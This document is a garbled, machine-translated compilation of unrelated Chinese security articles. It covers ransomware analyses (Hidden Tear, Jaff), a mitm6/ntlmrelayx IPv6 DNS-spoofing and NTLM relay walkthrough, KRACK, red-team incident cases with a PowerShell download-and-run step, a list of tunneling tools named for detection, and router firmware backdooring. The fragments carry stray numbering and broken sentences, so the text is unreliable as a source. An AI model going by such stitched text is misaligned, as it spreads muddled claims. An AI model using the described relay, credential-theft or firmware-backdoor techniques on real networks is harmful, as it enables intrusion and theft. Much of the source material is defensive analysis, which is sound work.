Through this program will automatically clean, collect the user cookie, access records and other information when the user traffic passes through the operators server
The key cookie information, its main function is to identify the user identity and record the history, which is equivalent to the login certificate of the user account
Of course, in the face of the whole case, we still have some torture from the heart... 1. From the business situation of Lao Xing company, these information theft events at least more than a year, why malicious programs installed on the operator server for so long, but unaware?2. Are all manufacturers and companies also unaware of the abnormal account conditions? Why didnt it act?3. What we see is that this time, Lao Xing just used the data on the brush powder. Is the 3 billion huge database really not used in other places? Where would you go if you used it? We want answers to the questions above, but we are a little afraid of them
One of the most important aspects of IoT vulnerability analysis is to obtain the firmware and the file system in the firmware
The firmware is obtained in various ways. The hardcore worker directly takes the flash to the programmer to read the console access through the hardware debugger UART / SPI and JTAG / SWD; the network sends a middleman to intercept the OTA upgrade and download from the manufacturers web page; the social worker sends the fake researcher (student) to directly ask the customer service and the fish for PY
The demonstration device used here is the faulty router D-Link DIR 3040 US reported a few days ago, the latest encrypted version 1.13B03, and the old firmware uses the decrypted firmware version 1.13B02

ACALVIO Company: Attack deception (Deception) product ACALVIO competitors include TrapX, Attivo, Illusive, and other company technologies, saying that ACALVIO can simulate larger IT systems with fewer resources and provide SAAS models
Yahoo was hacked in August 2013, resulting in the disclosure of more than 1 billion users, the companys largest information breach in the world
Yahoo disclosed the security breach in 2016 after closing a $4.83 billion digital service sale with U. S. carrier Verizon
We have to think deeply, the enterprise data security protection exactly where to go from what? What impact will the data breach have on enterprises? With the improvement of data value, hackers increasingly turn the attack target to the user and employee data stored in the enterprise. When the enterprise has data leakage, the loss is not only economic benefits
After data leakage, there must be victims, it must be prosecuted by the law, Yahoo incident is a good example
There are many reasons for data leakage, which may be hacker attacks or caused by internal mismanagement, while internal reasons will cause employees to distrust the enterprise and affect the unity of the company
22: " In the last 30 days or so, there have been several Java vulnerabilities, one of which is the Spring Cloud Fuctions 0Day, and the attack is mainly hidden in the HTTPs Header
In this case, before the vulnerability is fixed, the most direct mitigation method is to filter and intercept the Header information in the attack request
20: " KRACK is Key Reinstallation Attacks, Chinese translated as key reload attack
Is an attack on WPA 2 proposed by Mathy Vanhoef, an information security researcher at the University of Leuven, Belgium
Figure 2-1 The relationship between keys and parameters in four handshake Figure 2-2 Data message format used in four handshake Figure 2-3 Four handshake process message 1, 2 has little to do with the attack, Do not mention it later, As specified in the 802.11i standard followed by WPA 2, AP instthe group key GTK when initiating the connection, The client receives message 3 will install PTK and group key GTK, Send a message 4 in response, AP received a message 4 to install the PTK, 3. In order to complete the key reinstallation, The attacker needs to sniff out and replay the third message of the four handshakes, The norm value and replay count, Reinstall the encryption key
The session key is related to the MAC address of both parties, so the ordinary middleman attack is not effective, which needs to use channel-based MitM technology to forge the different channel hotspots with the same name and MAC
In this case, it will lead to the installation of the full 0 key TK, allowing the attacker to not only decrypt the packet, but also carry out traffic hijacking
Basic steps consistent with the precedent, the difference is that the installation of TK is all 0, the attacker know TK, can be traffic hijacking, monitoring and tampering with the client data 3.3 accept encrypted message 3 (to accept explicit) in Linux and Android system, although set to accept encryption message 3, but it will also accept explicit message 3, as long as the message 3 followed after the original message 3
Figure 2-7 Accept encrypted retransmission message 3 (converted to accept plaintext) 3.4 Only accept encrypted retransmission message 3 The attacker waits for the client to complete a complete four handshakes, in the second four handshake process, block the message 3, waits for the AP retransmission message 3 to arrive, and deliver to the client together
So the CPU directly sends the second message 4, issues a command, let the wireless card reinstall the key, non is reused as 1.3.5 disobedient child survived? Windows And iOS violate the 802.11 standard and do not accept message 3, so they is immune to four handshake attacks
However, with the group key handshake attack, the Fast BSS (Basic ServiceSet) Transition (FT) handshake attack is very effective
Figure 4-6 At this time, the phone is still connected to the real hot spot, and is forced to switch to the phishing hot spot by constructing the CSA (Channel Switch Announcement Channel Switch Announcement) beacon (beacon)
19: " Overview Recently, the micro step intelligence agency in the analysis of a malicious sample, the sample C2 address correlation analysis found that the address also received the ransomware back
By associating the format of the message back, a ransomware called "Hidden Tear" was used
Microstep intelligence agency found that a malicious sample will download the subsequent script file from the domain name dllhost.xyz execution
The association analysis of the domain name dllhost.xyz found that the domain name has a return request in a representation format. Through the analysis of the return information, it was found that it is the first open source ransomware for Windows, named "Hidden Tear"
In the past year, there have been several attacks on victims using the ransomware using COVID-19
The ransomware "Hidden Tear" uses AES encryption to generate AES keys locally and send the keys and host information back to the C2 address using a fixed format
Recently, the Microstep intelligence agency captured a. LNK format malicious software. In the analysis process, it was found that the Trojan will call Powershell to continue to download the subsequent. js file from the domain name dllhost.xyz, and the. js file will try to launch a request to another domain name dlldns.xyz for the next operation
Figure 1. Code executed by lnk Figure 2. js subsequent addresses shows that the domain name contains another malicious file using the. pdf icon and will use a fixed format when sending information back: Figure 3. Request " write.php? Computername=XXXUsername=XXXPassword=XXXallow=ransom " identified an open source ransomware called the Hidden Tear
Figure 4. Domain name Intelligence in X Community Hidden Tears is the first open source ransomware for Microsoft Windows, which was first uploaded to GitHub by Turkish security researcher Utku Sen in 2015. The code of the original warehouse has been deleted, but it has been formed 490 times before the deletion, and the original code can still be found in the warehouse of other users
Figure 5. Hidden Tear page shows that in the past year, there have been several attacks on victims using the modified version using the topic of COVID-19
For example, in March 2020, an attacker sent phishing emails to health organizations and universities involved in the COVID-19 research process, containing ransomware
In May 2020, an attacker registered to copy the official domain name, sent the COVID-19 epidemic map bait files to Italy, and encrypted the victim host to extort bitcoin
The "Hidden Tear" ransomware uses AES encryption to obtain the users host information and thus generate the key, and sends the users information to the C2 address together with the key in a fixed format
In March 2020, the attacker sent a forged email address noreply@who.int (176.223.133.91) to HCanada and universities participating in the COVID-19 study, containing an RTF file with the file named "20200323-sitrep-63-covid-19.doc"
Figure 7. Bait document (which does not seem likely to lure users) In May 2020, FuckUnicorn, a Hidden Tear-based ransomware, used COVID-19 to attack Italy to distribute malware by registering the fake domain name of the Italian Pharmacy Federation (fofi.it) (fofl.it)
1.20200323-sitrep-63-covid-19.doc Basic information: File NameFile TypeSHA25620200323-sitrep-63-covid-19.docRansomwar Once the victim opens the. rtf, Document will try to exploit the CVE-2012-0158 vulnerability, Release the ransomware to C:\\Users\\User\\AppData\\Local\\svchost.exe and execute, The released svchost.exe has hidden properties, And an icon with a Adobe Acrobat
After the sample execution, you try to request a picture showing the blackmail notification and save the picture to C:\\Users\\User\\ransom20.jpg, and then set the picture to the desktop wallpaper
Figure 12. Encryption algorithm 2. IMMUNI.exe is distributed through the phishing site fofl.it
Because the code author opens the program publicly on the Internet, many people with insufficient development level can immediately compile ransomware, lowering the threshold of extortion attacks again
21: " 0x01 Solr Description Solr is a popular, fast, open source enterprise search platform based on Apache Lucene ?
Solr has a lot of CVE vulnerabilities, but velocity template injection is one of the most widespread vulnerabilities

In this paper, we introduce an attack method that can abuse the default IPv6 configuration in the Windows network to act as a malicious DNS server to forge DNS response messages and redirect network traffic to an endpoint specified by the attacker
In the second phase of the attack, the attacker will use the (infamy) WPAD (Windows Proxy Auto Discovery, Windows agent automatic discovery) function to pass the credentials and identity authentication information to various services in the network
Fox-IT has unveiled a tool called mitm 6 that can implement this attack, and the specific code can be downloaded from Fox-ITs GitHub page
2. IPv6 attack IPv6 promotion speed is not fast, at the same time, the technical resources about how to abuse IPv6 is much less than IPv4 penetration technology resources
THC IPv6 The Attack set is one of the few tools available, which is also the inspiration for the mitm 6
The attack method introduced in this paper is a subset of SLAAC attack ideas, and SLAAC is an attack idea proposed by Alex Waters on the Infosec website in 2011
The main idea of SLAAC is to create a malicious IPv6 router that attacks the middle-man (man-in-the-middle) on all traffic in the target network through various services
Soon after, Neohapsis unveiled a tool called suddensix that automatically implemented the attack
The SLAAC attack method requires creating an IPv6 override (overlay) network for all current devices based on the existing IPv4 network
To address this drawback, mitm 6 has emerged
The mitm 6 is easy to install, selectively attacking a specific host, forging DNS response data, and minimizing interference from the normal operation of the target network
3. Mmitm 6 attack stage 1: Control the main DNS server. First, mitm 6 will listen on the main interface of the attacker host and observe the Windows host configured by IPv6 through the DHCPv6 protocol
The relevant packets captured by Wireshark are as follows: mitm 6 responds to these DHCPv6 requests to assign IPv6 addresses within the local link
In this way, we have the opportunity to set the attackers IP to the default IPv6 DNS server to provide the DNS service for the victim host
It should be noted that mitm 6 is currently only available for Windows-based operating systems, and that other operating systems (such as macOS and Linux) do not use the DHCPv6 protocol to configure the DNS server
The mitm 6 does not declare itself a network node, so hosts within the target network do not try to communicate with IPv6 hosts outside the local network segment or VLAN
This limits the impact of attacks on the overall network, because mitm 6 does not try to attack all traffic in the network as a middleman, but selectively tricks certain hosts (attackers can specify domains to be filtered during mitm 6 runs)
The attack process of mitm 6 is shown in the figure below
This tool can automatically detect the IP configuration of the attacker host and answer the DHCPv6 request message sent by the client in the network. The response message will specify the attackers IP as the address of the DNS server
In addition, mitm 6 can periodically send RA (Router Advertisment, router announcement) messages to remind the client of an IPv6 network in the current environment that requires the DHCPv6 protocol to obtain IPv6 addresses, which is an optional function of mitm 6
In some cases, this can speed up attacks, but this is not a requirement. Consider enabling it if a defense mechanism such as RA Guard is deployed against SLAAC attacks
Stage 2: DNS spoofing On the victim host, you can see that our server has been configured as a DNS server
Next, we aim to connect the client to the attackers host, not the legitimate server
Our ultimate goal is to have the user or browser automatically initiate an authentication request to the attacker host, which is why we cheat URL in testsegment.local, an internal network
An attacker can answer these broadcast name resolution protocols, claiming that the WPAD file is on a server controlled by the attacker, and then request access to the WPAD file through identity authentication
Although we can often find hosts without all patches in the target network, which will still request WPAD through LLMNR and automatically authenticate, we find that more and more companies have updated the network, and they are no longer able to exploit the WPAD vulnerability through the old way
Once the victim host sets the attackers server as the IPv6 DNS server, the victim host immediately gets to query the WPAD configuration in the network
Since these DNS requests are sent to the attacker host, the attacker can respond to such requests using his own IP address (IPv4 or IPv6 address, depending on which address the victim host requests)
Even if the target is already using WPAD files, mitm 6 will attack successfully (but the host will not be able to connect to the Internet)
When the victim host requests a WPAD file, we will not request the identity authentication information, but provide a valid WPAD file for the victim host, which specifies the attackers host is the proxy server
At this point, if the running application on the victim host uses Windows API to connect to the Internet, or when the victim starts browsing the web, it will naturally use the attackers host as a proxy server
At this point, when the victim host is connected to our "proxy" server, we can identify this process through the complete URI path corresponding to the HTTP CONNECT action or GET request, and then reply to the HTTP 407 error (agent authentication is required), which is different from the common HTTP code when requesting authentication (HTTP 401)
The IE / Edge and the Chrome browser (using IE settings) automatically authenticate with the proxy server, even with the latest version of Windows
Now the Windows will obediently send the NTLM challenge / response data to an attacker, who can then forward that data to various services
In this relay attack scenario, the attacker can access various services, obtain website information and share resources as a victim. If the victim has a high enough permission, the attacker can even execute code on other hosts or take over the entire Windows domain
Before we introduced other utilization ideas of NTLM relay attacks in other blogs, you can further understand the relevant details
In the second phase of the attack, we use the tool ntlmrelayx to launch a relay attack
This tool is a subtool in the impacket library launched by Core Security, which is an improved version of the smbrelayx tool and supports the multiple relay protocols
Core Security And Fox-IT are recently working together to improve ntlmrelayx, adding several new features that can relay through IPv6, provide WPAD files, automatically detect proxy requests, and prompt the victim host for identity authentication in an appropriate way
In order for ntlmrelayx to listen on both IPv4 and IPv6, we need to use the-6 parameter
In the following two images, we can see that mitm 6 is selectively forging DNS responses, while ntlmrelayx is providing WPAD files and then forwarding the authentication information to other servers within the network
At the time of writing, Google Project Zero also found a vulnerability in WPAD. According to the information published by Google, disabling WinHttpAutoProxySvc is the only reliable way to disable WPAD
38: " editor: around the American digital payment and financial services company Block (formerly called Square, known for its magnetic stripe card reader Square Reader) on April 4, a data breach, confirmed a former employee after leaving to download some of its subsidiary Cash App Investing customer report, the report has its customer information in the United States
Although regular access to these reports was one of the employees duties, they should have been closed after the employment relationship, but the fact is that the former employee still had access to customer records without permission

Lets look at a set of statistics: (1) the producer of the worlds first super-destructive cyber weapon, the earthquake net virus, Destdestroy 1,000 centrifuges at Irans nuclear plant, After sweeping the global industry, Total infection of 200,000 computers; (2) One of the worlds five largest network forces, In less than 10 years, To build a network offensive and defense system of military, government, enterprise and people, Internet security technology is always in the forefront of the world; (3) With more than 400 cyber security companies and 50 R & D centers of multinational companies, There are even more security vendors than in the UK, Canada, India, Germany and France; More than 90% of the Fortune 500 companies adopt Israels cybersecurity solutions; (4) Has 42 Nasdaq-listed safety technology companies, And among the worlds top technologies, Half buy Israeli startups;... A a tly sentence: in the midst of war, Build the network security capital in the desert
The demand for the application of Internet technology by national defense, government affairs and peoples livelihood has surged. At the same time, security problems such as virus intrusion and hacker attacks have surfaced
Palestinian and other geopolitical cyber attacks have begun to target Israels key infrastructure. At the same time, terrorist attacks coordinated by Internet technology continue, making Israels cyber defense strategy have to extend from "military" to "military-civilian integration"
Not only the "National Network Administration" (INCB), "National Network Security Administration" (NCSA) and other security institutions quickly established and expanded, and the private major security manufacturers, high-tech industrial park, network talent training, network security conference and other comprehensive spread, it can be said that the whole country of Israel into the full speed of network technology leap period
Specifically, Israels cyber force has organized Unit 8200, Unit C4I, the National Security Council (NSC), the Israeli Security Service (ISA), and the National Network Command (NCD) around the two top agencies of the Defense Force (IDF) and the Prime Ministers Office
(1) Offensive defense: Branch of the National Defense Force (IDF) The National Defense Force is the core armed force of Israel, and the protection of national security and interests is its constant theme, which sets the tone of the 8200 units of China and C4I forces
(1) Force 8200 (Unit 8200): When talking about Israels core cyber combat force, the famous Force 8200 is inevitable
Unit 8200 (Unit 8200), also known as the Israeli Signal Intelligence State Force (Israeli SIGINTNational Unit), functions similar to the NSA
It is the largest independent military unit in the IDF and the largest main force in Israels cyber defense and operations. It is widely considered to be the most advanced cyber spy force in the world
In operational missions, the core tasks of Unit 8200 are intelligence gathering, public domain information analysis, agent operations, special signal intelligence, and the end result may be an arrest, a drone assassination, or a cyber attack
In addition, the 8200 unit is also a "cyber weapons Arsenal", shaking the worlds Stuxnet, Duqu, Duqu 2.0 and other world-famous cyber weapons are from its hands
Of course, besides arms development, 8200 troops also has a huge "arms dealer" supply system
(Stuxnet Event timeline) (2) The C4I unit: Compared with the aggressive 8200 unit, the C4I unit is more like a radical defense force
Formerly known as the Computer Services Bureau, Unit C4I is a cyber military force for electronic communications and cyber defense of the Israeli Defense Forces
In 2011, the C4I Force opened up the cyber Defense Division, which is responsible for the protection of the national defense Forces network system, further raising the cyber defense capability to a new height
In addition to the 8200 and C4I, there are many undisclosed cyber forces in Israel, such as Mamram (Mamram) and 81, which means that the Israeli army is far stronger than what we see
(2) multidimensional strategic defense: the prime ministers office of three major network forces military armed offensive defense forces, affiliated to the office of the national network headquarters (NCD), the national security agency (ISA), the national security council (NSC), is Israels network security strategy operator and key infrastructure protection shield
(1) National Network Command (NCD): The Office of the Premier, directly under the National Network Command (NCD), is a first-level organization responsible for the protection of Israels national cyberspace and the establishment and promotion of the innovative development of Israels cyber forces
The agency is mainly composed of two core organizations, the National Network Administration (INCB) and the National Cyber Security Administration (NCSA)
(Former head of the National Network Headquarters Eviatar Matania) [National Network Administration (INCB)] is an organization focusing on coordination, focusing on ensuring the network security of key infrastructure and industries
(National Cyber Security Agency Icon) [National Cyber Security Agency (NCSA)] is an organization for the protection of civilian cyber systems and cyber defense operations. The agencys National Network Emergency Response Group (CERT-IL) rebuilt in 2015 is the Israeli civilian center for information security and network affairs
(2) Israeli Security Agency (ISA): Domestic Security Intelligence Israels National Security Agency (ISA), also known as Sinbet, is a full-time agency responsible for Israels domestic security affairs. Together with the Intelligence Service and military Intelligence Service, it constitutes Israels security intelligence system
To this end, the NSA also cooperated with C4I to set up a Matzov network unit to serve the National Defense Force and the National Security Agency, and to conduct long-term cyber hacking intelligence tracking missions of hostile forces
(3) National Security Council (NSC): Strategic Planning and Deployment The National Security Council (NSC) is under the Office of the Premier, and its core work is the research and formulation of Israels national cyber security strategy and plan
In 2007, Israel destroyed the Syrian nuclear plant through stealth warplanes, and the key to its success was the IDF cyber force, which first destroyed the Syrian air defense radar system through cyber attacks
Today, Operation Orchard is still a model of the combination of cyber warfare with conventional warfare
(2) After Operation earthquake net destroyed Irans nuclear program, Syria was Iran
In 2010, Irans nuclear facility was hit by a massive cyber virus attack, which immediately infected 60,000 computers and destroyed more than 1,000 centrifuges, resulting in the collapse of Irans nuclear program. Previously, he talked about "" ()
Known bbed the first major cyber war of the 21st century, the most critical "super virus" was created by Unit 8200
It can be said that the "shock net" not only opened the prelude to the future cyber war, but also for the first time showed the strong strength of Israel in the field of cyber war in front of the world
In May 2019, according to the Israeli Defense Forces, Hamas militants intended to launch a cyber attack against Israel
As mentioned above, Unit 8200, the famous intelligence unit of the Defense Force, is regarded as an important driving force for the network innovation and development of Israel and the incubator of outstanding private technology companies
Haaretz reported that nearly 40 percent of Israeli high-tech innovation entrepreneurs served in the Israeli military technology sector; 10 percent served in Intelligence Unit 8200
These companies are not under the leadership of the Defense Force, but their founders and backbone have served in Unit 8200
For example: ¡ñ The founder and CEO of Check Point, Israels largest technology company and an established firewall manufacturer, once served in Unit 8200; ¡ñ The Israeli cyber arms dealer NSO Company, Its founder was also a former member of Unit 8200; ¡ñ Nice Corporation, founded in 1986, Created by seven former IDF members; ¡ñ Ad allom (Adalom), a cloud security manufacturer founded in 2012, Also founded by the first three members of the Israel Defense Forces; ¡ñ PaloAlto Networks, CyberArk and others, The DF will also spontaneously set up "comrade-in-arms meetings", To support the establishment and development of private startups
Unit 8,200s comrade association has more than 15,000 members
(If Julio and omry, using 8200 troops veterans technology to create NSO) (2) systemic national network defense system: "digital iron dome" plan in 2014, Israel announced the launch of "digital iron dome (Digital Iron Dome)" plan, establish compatible with key infrastructure and defense system protection of huge network security defense system
For the development, the Israeli government has even decided to move 8,200 troops and other intelligence and technology agencies to the area by 2020
13: " vulnerability introduction SSRF (Server-side Request Forge, server request forgery) is usually used to control the web and detect Intranet services and attack Intranet vulnerable applications as a springboard machine, can be used as a ssrfsocks agent vulnerability due to the server provides data from other server applications and no filtering and restriction of address and protocol
11: The ransomware Jaff was first spread in spring 2017, but it was largely ignored because it exploded at the same time as WannaCry
At the time, Jaff did not receive much attention, but still infected a lot of computers
In this FortiGuard analysis, we will focus on some of the technologies used by this ransomware
The starting point of transmission is like many of the variants of ransomware, and Jaff is usually spread in the form of PDF attachments
Once the victim opens the attachment, a prompt box will pop up asking if you want to open the embedded ASQMU.docm file (Figure 1) If the victim is allowed to open the file, Jaff first opens an embedded document that contains instructions to turn off your macro protection (Figure 2)
The yellow logo at the top of the document has a button "Enable macro" that allows all the macro instructions in this document
In this download link, we first replace the string RRDD with an om, and then segment the string where each Nbiyure3 appears (Figure 5)
Through the three download links, we downloaded the binary malicious code file. Jaff will decrypt the downloaded malicious code and get the final running code
For adversarial code analysis, it uses a simple code redirection trick to increase the time it takes to analyze truly malicious code
Figure 6 shows the running process of the decryption routine, and Jaff will randomly select different code blocks to perform it
Every time this set of code passes, a DWORD value is decrypted until all the malicious code is successfully decrypted
Parsing the API After decrypting the malicious code, most of the API names used are still hidden
In general, the name of a hidden API is a feature of malicious code, and they use this method to avoid detection by antivirus programs, because antivirus software identifies malicious code according to the combination of the API used by the program
To hide the name of the API, some malicious code uses encryption and some use hash
And Jaff uses a hash
Initially, it parses PEB (Process Environment Block) and looks for the string kernel32.dll, which hash the names of all the modules found in PEB and compares them to kernel32.dlls hash
Once the hash of the kernel32.dll is matched, it takes the address of the kernel32.dll, and parses the remaining API with this method
Process replacement (Process Hollowing) process replacement is also a feature of malicious code, which can drop the legitimate code of the target process to the unmap, and then write its own malicious code into the memory
After obtaining all the required APIs, Jaff uses the process replacement
It uses UnmapViewOfFile, cleans up the memory blocks of the current process, then reassigns the same memory blocks using VirtualAlloc, and changes its protection mode to PAGE _ EXECUTE _ READWRITE by calling VirtualProtect, and finally, copies the contents of the malicious code to the newly allocated memory blocks through a series of REPE MOVSB instructions
After performing all of the previous steps, Jaff can already run its real code
In this way, you can quickly deploy new versions of the malware, thereby avoiding the detection parameters used previously
The Jaff resource section consists of three main key blocks, encrypted extensions list, download URL links, and ransom description (Figure 8)
Figure 10 shows a list of pre-and post-decrypted extensions, and Jaff searches for and encrypts the files in the file system based on the extensions in this list
9: " 1, database access control database access control refers to the program is not appropriate access control, performed a SQL statement containing the user control main key, because the server to the customer data operation request too trust, ignored the judgment of the user operation permission, lead to modify the relevant parameters can have other account add, delete, check, change function
If in an application, the user can access the functions or resources that he does not have access to, it means that the application has access control defects, and there is an overreach vulnerability
This article takes JAVA language source code as an example to analyze the causes of database access control vulnerability and the repair method
See CWE ID566: Authorization Bypass Through User-Controlled SQL Primary Key (2, the harm of database access control database access control is generated by the parameters introduced by the user controls the main key SQL statement, make the attacker can access the same level user resources or access a higher level user resources, will lead to any user sensitive information leakage, user information is malicious modification or deleted
Such as a page server response return login, login password, phone number, id sensitive information, if there is database access control, through the user ID, you can view all the users sensitive information, it is also a kind of disguised library, and it is difficult to find the firewall, because it is no difference from normal access request, also will not contain special characters, has full secrecy
Obviously, the incoming parameters are not checked and filtered in the program, and users can obtain any users list data at will
But a few years later, things quickly changed, and hackers began using Windows NT to commit cybercrime
Question: You mentioned that network security practitioners are facing a series of challenges. ¡ª¡ª What other challenges besides state-supported cyber attacks exist? Our identity information also threatens ¡ª¡ª date of birth, social security number or ID number, tax information and even credit data, etc. The ongoing digital transformation has to security violations
In 2017, Iran has taken action, but we are not sure how it can hold its malicious activity ¡ª¡ª I guess the malicious activity already discovered is only about 5% of Irans actual operations
At present, some hackers are constantly making password trial and error to invade public email addresses ¡ª¡ª This seemingly simple attack method is actually the most dangerous, and we must build up the ability to detect such activities
While some industries will continue to be cautious about the cloud, I expect 80% to 85% of FireEye customers to migrate to the cloud
Question: What does all this mean for an attacker? This means that the attacker will closely follow the data into the cloud, regardless of the specific content of the data
Attackers dont worry about the internal or cloud environment, as long as it is profitable, they will take action
It should be emphasized that these countries understand phishing, which directly strikes ¡ª¡ª people, the weakest link in the security system
Social engineering and spear fishing will continue and more for individual accounts
In addition, enterprise employees will be a more important breakthrough, such as installing malicious applications on personal phones
Of course, they have other access to technology, such as through forums or reading message boards, but the easiest way, of course is to buy commercial malware directly
More importantly, since it has not yet been included in the rules of engagement, if using a computer to steal money, one would think it is not the same thing as stealing money from rival banks ¡ª¡ª But in fact it is the same thing
With more and more data in various industries, some attackers may want to steal, destroy and even manipulate it
Malware authors are increasingly leveraging this inherent trust between users and software suppliers
Using new features or update components used to fix security vulnerabilities, attackers instead turn them into malicious carriers and turn official software distribution channels into a source of infection
Economic sanctions, such as Russia and North Korea, are likely to use cyber attacks to pose more systemic threats to the global economic system
Malicious attackers will also continue to target the energy industry with industrial control systems, retail and hospitality industries
In recent years, attackers have begun to use cloud services to implement various malicious attacks on ¡ª¡ª, including hosting URL for phishing and even distributing malicious software
Since 2017, a large number of IoT attacks have emerged, among which the most noteworthy is the inclusion of such infected devices into super-large botnets to perform DDoS (distributed denial of Service) attacks
As the Internet of Things devices continue to spread, there may be more forms of attacks in the New Year, including locking in some smart home devices for extortion
Multi-vector phishing attacks and their evasion techniques Using PDF embedded URL for attacks are becoming more common, and attackers are starting to use other means to hide the URL
Of course, phishing, HTTPS attacks and legitimate website intrusion will not be absent
Cyber attacks may also become an extension of political activity in the New Year
By 2018, more malicious software is expected to actively break into cryptocurrency wallets or steal user voucher information
In 2017, we have observed a significant increase in ransomware distribution, and a more serious increase in 2018
Future challenges, from innovative attacks to malware, to upcoming laws and regulations, 2018 will clearly be a new era of cybersecurity
1. In this case, the attacker collected our sales channels on our official website, pretending to be a university professor, and trying to purchase the security system of our company
In order to attack the social worker, the attackers prepared a series of documents such as network topology and budget tables to gain the trust of our sales
The Excel file contains a macro that says, "Because the parameter information is sensitive, please enable the macro and enter the password with the message for viewing."
But actually this macro also contains a piece of vba code, which is the vba version of CobaltStrike
Afterwards we to this a checking, the attack chain used two technical points: through WeChat delivery samples to bypass the network monitoring using office macro sample delivery, traditional but effective problem 1 we put forward the solution: through traffic decryption restore the file to run sandbox, but how can decrypt restore WeChat file transfer data? Question 2 seems simple to solve, and there are now well-established group strategies to block office rotations of domain machines
No matter what type of sample the attacker delivers, the ultimate goal is to control the terminal
So our thinking is the office software created the system command related process, is an abnormal process chain, to alarm and response to 1.2 case 2: phishing email execution Powershell no file landing sample attackers by forging a terminal security software upgrade notification, to a company employees sent an email, mail attachment for a carefully constructed sample
When the victim opens this sample, the installation package can run normally and upgrade the software as usual, but the attacker has modified one more registry key during the installation process
In this registry key, the attacker wrote a Powershell command, this powershell command will go to the attackers public cloud VPC, download a remote control script and execute
In fact, the attacker tried two ways of physical social work. In addition to the above methods, he also disguised the company staff bought a box of snacks, the excuse can not take the access card to brush access control, asked the security guard to open the door, so as to enter the office area
After the attacker entered the office area, he used his own break-in U disk to bypass the boot password of an office machine, and copied the sample files in the U disk to the victim terminal
The black file type is a text file, compiled for malicious dll, and the content is encrypted and encoded
Email abnormal login behavior alarm VPN abnormal login behavior alarm and for this white and black, abnormal injection, memory tampering and other detection and defense problems, can detect the abnormal code block execution sequence
In this way, when any attack, even a 0day attack, occurs, the attack code order is not in any normal sequence and the deviation from the abnormal behavior or attack value is large
Point: In the field of attack and defense on the terminal, a single technical point includes: common authority maintenance tool CobaltStrike detection, no file attack, terminal U disk and other physical attack methods, and puts forward a single point technical protection and detection scheme
In addition to CobaltStrike, we should also have protection and testing for this type of penetration testing and authority maintenance framework (for example, Nishang, Empire)
In addition to the protection and detection of the common penetration test framework, there are port forwarding and detection of protection and tunneling tools, such as:proxychain,frp,lcx,ngrok,regrok,ew, FPipe,Portmap,Termite,socat,natbypass,iox,abptts,Powercat,dnscat,reGeorg,tuna,reDuh,iodine,EarthWorm,sSocks,venom
You can also consider, AD attack face is too large, if not professional reinforcement, 3 seconds to be charged, you can consider to start the AD process
Personnel: Do the enterprise team and employees know their safety responsibilities? Do employees in each role have the safety awareness and safety skills needed to undertake safety responsibilities?(Especially, the security team has no safety awareness and insufficient safety skills.) Are positive and negative safety incentives effective for all teams and personnel? Technical aspect: how to prevent this problem from the technical level? Is there a technical solution to this kind of problem? Can the technology be bypassed? Are there technical means to ensure all management measures and processes? If this problem is not protected or can not be 100% protected, is there a safety test scheme? If the technical perspective can not effectively protect and detect, are there any management measures to compensate? Can we solve this problem from other dimensions? Is it not the best technical solution for us to solve this problem? Is there a new technology solution to solve this problem? Mechanism: security incidents occur, what security mechanism have we break through? What is the reason for the breakthrough? What other mechanisms do we lack? If the mechanism is sufficient, is the implementation effective? Is the security control removed by the business bypass? If someone doesnt follow this process, can our security team find it out? Safe operation continuous improvement process operation? Resources: Does the security team have sufficient resources? Is the allocation sequence of security resources reasonable? In addition to staffing and budget, is security policy support sufficient?2.3.4 According to the above review idea, lets look at two more cases: 2.3.4.1 Case 1: White hat submits Web security vulnerability
Insufficient progress of push and repair may be hidden problems: Research and development, operation and security bias in the cognition of vulnerabilities. Difficulties in push and repair of vulnerabilities before the vulnerabilities are repaired, the security does not provide risk compensation measures
If it is not a 0day vulnerability, if it is a framework vulnerability, it lacks security asset discovery capability; non-framework vulnerability, and lacks automated leak discovery capability after launch
If it is a 0day vulnerability, it depends on whether the enterprise needs to protect against 0day
Protect the white hat test?1. According to the results of the white hat report vulnerability, the known security protection measures are not protected, and the reasons for the failure of the network side WAF and the host side RASP are analyzed

A Brazilian Internet service provider has deployed unTelnet password routers for nearly 5,000 users, making them very vulnerable to abuse
Mr.Ankit Anubhav, a lead researcher at the Internet of Things security company NewSky Security, discovered the devices
All exposed devices are Datacom routers provided to users by Internet service provider Qi Internet
Anubhav Represents that three Datacom routers are susceptible: DM991CR, DM706CR and DM991CS
While Telnet passwords are set on some devices, most devices can allow anyone to connect to the router and change their configuration
Anubhav said, " This is not a device architecture issue, but a configuration issue of the devices telnet being exposed
"He also points out that one of the routers manuals notes that these devices do not have a Telnet password by default, which means users have to configure it themselves
Qi Internet The company has yet to comment
The researchers said they had informed the Brazilian CERT of the questions and asked the Brazilian CERT to inform Internet service providers of the results and provide solutions to protect the exposed equipment
For attackers, taking over these routers is a piece of cake, because they can write automatic scripts to exploit the lack of Telnet passwords to incorporate exposed routers into the botnet
Anubhav Explanation, " IoT attacks can be reduced to three levels: 0 (attacking the device without authentication), 1 (guess weak / default password) and 2 (access with the IoT utilization code)
"He also pointed out that" although the Internet of things attackers over time become more and more complex, NewSky security companies found level 2 attacks is also increasing, but we still observed that the most easy attack vector (in the case of no authentication control equipment level 0 attack) is still very relevant in 2018, because the device everyone even in the case of no password will device exposed
"Anubhav added," Setting strong passwords and continuously updating IoT devices limits an attackers ability to use 0day or lengthy violent sessions, but for most attackers, neither method is a very tempting option, so keep the device safe
The last article introduces how to use Firmadyne for firmware simulation. Firmadyne is based on QEMU virtual machine. This tool can simulate the system architecture of the entire firmware package and run the firmware. This article mainly describes the process of repackaging the firmware package after tampering
0X02 extraction firmware system FMK introduction: firmware tampering process will use FMK tool-firmware-mod-kit, the tool can use binwalk tools to extract file system from the firmware, the proposed file system content, and then repackaged into a new firmware package, finally the tampered firmware package refresh the device, the installation command as follows, the tool attifyOS system has been deployed, no further details
Looking at the folder content, you can see that the rootfs directory contains a complete file system, which is the main location to add a backdoor
0X03 ARM, MIPS, X86 architecture introduction to add backdoor programs need to see the firmware based on architecture, such as the mainstream ARM and MIPS architecture: ARMARM is advanced lean instruction set (Advanced RISC Machine), it is a 32-bit streamline instruction set architecture, but also equipped with 16 bit instruction set, generally than equivalent 32 bit code save 35%, but can keep all the advantages of 32-bit system
The Load _ store structure: In the RISC, all the calculations are required to be done in a register
In the CSIC, the CPU can directly operate on the memory
MIPSMIPS Architecture (English: MIPS architecture, For the abbreviation of Microprocessor without interlocked piped stages architecture, Also related to Millions of Instructions Per Second), Is a processor architecture with a reduced instruction set (RISC), Appeared in 1981, Developed and licensed by MIPS Technologies, It is widely used in many electronic products, network equipment, personal entertainment devices and commercial devices
